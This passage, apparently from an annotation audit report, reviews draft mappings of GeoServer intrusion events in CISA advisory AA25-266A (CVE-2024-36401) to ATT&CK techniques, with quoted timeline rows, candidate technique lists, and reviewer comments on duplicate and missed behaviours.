    CVE-2024-36401 added to CISA’s 
    Known Exploited Vulnerabilities 
    Catalog. 
    July 15, 2024 GeoServer 1 EDR detects Stowaway tool on GeoServer 1. 
    July 24, 2024 GeoServer 2 Initial Access to GeoServer 2. 
    July 31, 2024 Web Server Initial Access to Web Server. 
    July 31, 2024 SQL Server Initial Access to SQL Server. 
    Aug. 1, 2024 SQL Server, GeoServer 1 
    Organization observes SQL Alert and 
    contains SQL Server and GeoServer 
    1. 
    Aug. 1, 2024 n/a The impacted organization requested assistance from CISA 
    Aug. 5, 2024 n/a CISA began forensic artifact analysis. 
    Aug. 6, 2024 GeoServer 2 
    Last observed threat actors’ 
    activity—discovery commands on 
    GeoServer 2. 
    Aug. 8 – Sept. 3, 2024 n/a CISA conducted th

**自动验证** 引文、页码、偏移和正式契约均通过。


**候选** T1590.002, T1210, T1187, T1189, T1685.006, T1556.007, T1566.001, T1677, T1486, T1555.003, T1176.001, T1550.004, T1195.001, T1070.010, T1550.001, T1684.002, T1608, T1070, T1072, T1659, T1546, T1557, T1550.002, T1548.005
**映射复查** The timeline identifies initial access to the Web Server but does not specify the access method. The broader report describes movement from GeoServer 1 to the Web Server, but this row does not support any supplied technique specifically.
- AI 复核 other · The timeline labels Web Server access as initial access, while page 5 describes movement from GeoServer 1 to the Web Server. The evidence does not specify a separate initial-access method, so retain no technique mapping and reconcile the event wording.

## AA25-266A-P031

PDF 第 18 页 · observed · high · draft

**行为** gain initial access → SQL Server

**上下文说明** Timeline records initial access to the SQL Server.

**引文**

    July 31, 2024 SQL Server Initial Access to SQL Server.

**同页前后文**

    EAR 
     
     
    Appendix: Key Events Timeline 
    Date/Time Relevant Host Event 
    July 1, 2024 n/a CVE-2024-36401 published. 
    July 11, 2024 GeoServer 1 Initial Access to GeoServer 1. 
    July 15, 2024 n/a 
    CVE-2024-36401 added to CISA’s 
    Known Exploited Vulnerabilities 
    Catalog. 
    July 15, 2024 GeoServer 1 EDR detects Stowaway tool on GeoServer 1. 
    July 24, 2024 GeoServer 2 Initial Access to GeoServer 2. 
    July 31, 2024 Web Server Initial Access to Web Server. 
    July 31, 2024 SQL Server Initial Access to SQL Server. 
    Aug. 1, 2024 SQL Server, GeoServer 1 
    Organization observes SQL Alert and 
    contains SQL Server and GeoServer 
    1. 
    Aug. 1, 2024 n/a The impacted organization requested assistance from CISA 
    Aug. 5, 2024 n/a CISA began forensic artifact analysis. 
    Aug. 6, 2024 GeoServer 2 
    Last observed threat actors’ 
    activity—discovery commands on 
    GeoServer 2. 
    Aug. 8 – Sept. 3, 2024 n/a CISA conducted their full incident response. 
      
    

**自动验证** 引文、页码、偏移和正式契约均通过。


**候选** T1530, T1505.001, T1590.002, T1555.003, T1566.001, T1677, T1486, T1210, T1611, T1110, T1195.001, T1070.010, T1550.001, T1684.002, T1070, T1567.004, T1176.001, T1659, T1546, T1550.002, T1548.005, T1021.003, T1207, T1136.003
**映射复查** The timeline identifies initial access to the SQL Server but does not specify the access method. The broader report describes movement to the SQL Server, but this row does not support any supplied technique specifically.
- AI 复核 other · The timeline calls this initial access to the SQL Server, while the report narrative describes the actors moving laterally to the SQL Server. Preserve the event but resolve the wording or scope; the timeline alone supplies no method to map.

## AA25-266A-P032

PDF 第 18 页 · observed · high · draft

**行为** conduct discovery commands → GeoServer 2

**上下文说明** Timeline identifies discovery commands as the last observed threat actor activity.

**引文**

    discovery commands

**同页前后文**

    al Access to GeoServer 2. 
    July 31, 2024 Web Server Initial Access to Web Server. 
    July 31, 2024 SQL Server Initial Access to SQL Server. 
    Aug. 1, 2024 SQL Server, GeoServer 1 
    Organization observes SQL Alert and 
    contains SQL Server and GeoServer 
    1. 
    Aug. 1, 2024 n/a The impacted organization requested assistance from CISA 
    Aug. 5, 2024 n/a CISA began forensic artifact analysis. 
    Aug. 6, 2024 GeoServer 2 
    Last observed threat actors’ 
    activity—discovery commands on 
    GeoServer 2. 
    Aug. 8 – Sept. 3, 2024 n/a CISA conducted their full incident response. 
      
    

**自动验证** 引文、页码、偏移和正式契约均通过。


**候选** T1681, T1654, T1677, T1489, T1070, T1195.001, T1668, T1195, T1202, T1496.003, T1690, T1548.003, T1027.009, T1480, T1070.003, T1480.001, T1053.002, T1564.001, T1090.003, T1547.006, T1548.005, T1482, T1033, T1070.006
**映射复查** The timeline only identifies discovery commands on GeoServer 2 without specifying what was discovered. The supplied candidates do not fit that unspecified activity.

## 待核实的证据

引文有误的候选可在 evidence_decisions 中编辑、拒绝或标记证据不足。

## 全局审核意见

- P001/P005 and P028/P029 are cross-page duplicates; automatic resolution may miss these because the evidence pages and host granularity differ. Keep the two separate initial-access occurrences on GeoServer 1 and GeoServer 2 distinct from each other.
- P003 bundles separate access, lateral movement, and shell/script upload behaviors across multiple servers; do not collapse it wholesale into P005 or P019 because that would merge different actions and scopes.
- P009 bundles ping sweeps with downloading fscan, while P010 describes later network and vulnerability scanning; these overlap broadly in discovery but the evidence does not establish they are one occurrence, and dropping either row could lose a distinct action.
- P021 overlaps with P024 on the first Stowaway C2 establishment; retain P026 as a distinct second C2 connection and P022 as separate forwarding and on-disk tool activity.
- P030 and P031 describe timeline entries labeled initial access to the Web Server and SQL Server, while P003 describes lateral movement from GeoServer 1 to those servers. The wording differs; preserve the rows separately absent evidence that these are the same access event.
-  · missed_behavior · Page 6 reports an unsuccessful or likely unsuccessful attempt to load a JavaScript extension on GeoServer 1 to obtain webserver information; no supplied behavior row captures that distinct attempt.
-  · missed_behavior · Page 6 reports creation of accounts that were later deleted, with no evidence of further use. P006 mentions valid accounts used for persistence but does not capture this distinct account-creation event.
-  · missed_behavior · Page 7 says the actors accessed service accounts by exploiting their associated services. P015 captures brute-force attempts but not this separate observed service-account access behavior.
-  · missed_behavior · Page 6 identifies use of a commercially available VPS from a cloud infrastructure provider during the operation; the inventory has no behavior for this infrastructure use.

## 已确认样本的独立对照

- AA25-266A-G001 · 未找到重叠提议
- AA25-266A-G002 · 未找到重叠提议
- AA25-266A-G003 · 未找到重叠提议
- AA25-266A-G004 / AA25-266A-P021 · needs_overlap_review · 独立映射 T1090, T1090.003 · 参考映射 T1090

逐条提议、处置和去重明细见 annotation_audit.json。
